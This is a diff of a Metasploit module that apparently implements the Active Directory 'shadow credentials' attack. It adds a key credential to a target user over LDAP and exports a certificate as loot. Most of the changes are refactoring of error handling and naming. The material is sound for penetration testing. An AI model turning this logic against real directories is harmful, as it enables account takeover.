@@ -49,13 +49,6 @@ class MetasploitModule < Msf::Auxiliary
       OptString.new('TARGET_USER', [ true, 'The target to write to' ]),
       OptString.new('DEVICE_ID', [ false, 'The specific certificate ID to operate on' ], conditions: %w[ACTION == REMOVE]),
     ])
-
-    # Default authentication will be basic auth, which won't work on Windows LDAP servers; so overwrite default to NTLM
-    register_advanced_options(
-      [
-        OptEnum.new('LDAP::Auth', [true, 'The Authentication mechanism to use', Msf::Exploit::Remote::AuthOption::NTLM, Msf::Exploit::Remote::AuthOption::LDAP_OPTIONS]),
-      ]
-    )
   end
 
   def fail_with_ldap_error(message)
@@ -63,27 +56,11 @@ class MetasploitModule < Msf::Auxiliary
     return if ldap_result[:code] == 0
 
     print_error(message)
-    # Codes taken from https://ldap.com/ldap-result-code-reference-core-ldapv3-result-codes
-    case ldap_result[:code]
-    when 1
-      fail_with(Failure::Unknown, "An LDAP operational error occurred. The error was: #{ldap_result[:error_message].strip}")
-    when 16
+    if ldap_result[:code] == 16
       fail_with(Failure::NotFound, 'The LDAP operation failed because the referenced attribute does not exist. Ensure you are targeting a domain controller running at least Server 2016.')
-    when 50
-      fail_with(Failure::NoAccess, 'The LDAP operation failed due to insufficient access rights.')
-    when 51
-      fail_with(Failure::UnexpectedReply, 'The LDAP operation failed because the server is too busy to perform the request.')
-    when 52
-      fail_with(Failure::UnexpectedReply, 'The LDAP operation failed because the server is not currently available to process the request.')
-    when 53
-      fail_with(Failure::UnexpectedReply, 'The LDAP operation failed because the server is unwilling to perform the request.')
-    when 64
-      fail_with(Failure::Unknown, 'The LDAP operation failed due to a naming violation.')
-    when 65
-      fail_with(Failure::Unknown, 'The LDAP operation failed due to an object class violation.')
+    else
+      validate_query_result!(ldap_result)
     end
-
-    fail_with(Failure::Unknown, "Unknown LDAP error occurred: result: #{ldap_result[:code]} message: #{ldap_result[:error_message].strip}")
   end
 
   def warn_on_likely_user_error
@@ -119,7 +96,7 @@ class MetasploitModule < Msf::Auxiliary
       result = []
       raw_obj[ATTRIBUTE].each do |entry|
         dn_binary = Rex::Proto::LDAP::DnBinary.decode(entry)
-        struct = Rex::Proto::MsAdts::KeyCredentialStruct.read(dn_binary.data)
+        struct = Rex::Proto::MsAdts::MsAdtsKeyCredentialStruct.read(dn_binary.data)
         result.append(Rex::Proto::MsAdts::KeyCredential.from_struct(struct))
       end
       obj[ATTRIBUTE] = result
@@ -168,7 +145,7 @@ class MetasploitModule < Msf::Auxiliary
     end
     print_status('Existing credentials:')
     credential_entries.each do |credential|
-      print_status("DeviceID: #{bytes_to_uuid(credential.device_id)} - Created #{credential.key_creation_time}")
+      print_status("DeviceID: #{credential.device_id} - Created #{credential.key_creation_time}")
     end
   end
 
@@ -180,7 +157,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     length_before = credential_entries.length
-    credential_entries.delete_if { |entry| bytes_to_uuid(entry.device_id) == datastore['DEVICE_ID'] }
+    credential_entries.delete_if { |entry| entry.device_id.to_s == datastore['DEVICE_ID'] }
     if credential_entries.length == length_before
       print_status('No matching entries found - check device ID')
     else
@@ -215,7 +192,8 @@ class MetasploitModule < Msf::Auxiliary
     credential = Rex::Proto::MsAdts::KeyCredential.new
     credential.set_key(key.public_key, Rex::Proto::MsAdts::KeyCredential::KEY_USAGE_NGC)
     now = ::Time.now
-    credential.set_times(now, now)
+    credential.key_approximate_last_logon_time = now
+    credential.key_creation_time = now
     credential_entries.append(credential)
     update_list = credentials_to_ldap_format(credential_entries, obj['dn'])
 
@@ -227,7 +205,7 @@ class MetasploitModule < Msf::Auxiliary
     pkcs12 = OpenSSL::PKCS12.create('', '', key, cert)
     store_cert(pkcs12)
 
-    print_good("Successfully updated the #{ATTRIBUTE} attribute; certificate with device ID #{bytes_to_uuid(credential.device_id)}")
+    print_good("Successfully updated the #{ATTRIBUTE} attribute; certificate with device ID #{credential.device_id}")
   end
 
   def store_cert(pkcs12)
@@ -249,7 +227,7 @@ class MetasploitModule < Msf::Auxiliary
     create_credential(credential_data)
 
     info = "#{datastore['DOMAIN']}\\#{datastore['TARGET_USER']} Certificate"
-    stored_path = store_loot('windows.shadowcreds', 'application/x-pkcs12', rhost, pkcs12.to_der, 'certificate.pfx', info)
+    stored_path = store_loot('windows.ad.cs', 'application/x-pkcs12', rhost, pkcs12.to_der, 'certificate.pfx', info)
     print_status("Certificate stored at: #{stored_path}")
   end
 
